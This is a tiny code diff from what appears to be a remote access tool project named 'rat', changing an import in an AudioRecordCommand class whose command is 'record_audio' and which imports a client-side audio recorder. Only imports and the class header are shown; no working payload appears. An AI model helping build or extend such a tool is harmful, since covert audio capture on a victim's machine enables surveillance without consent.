@@ -1,6 +1,7 @@
 import base64
-from rat.commands.base_command import BaseCommand
+from .base_command import BaseCommand
 from rat.client.audio_recorder import recorder
+
 
 class AudioRecordCommand(BaseCommand):
     name = "record_audio"
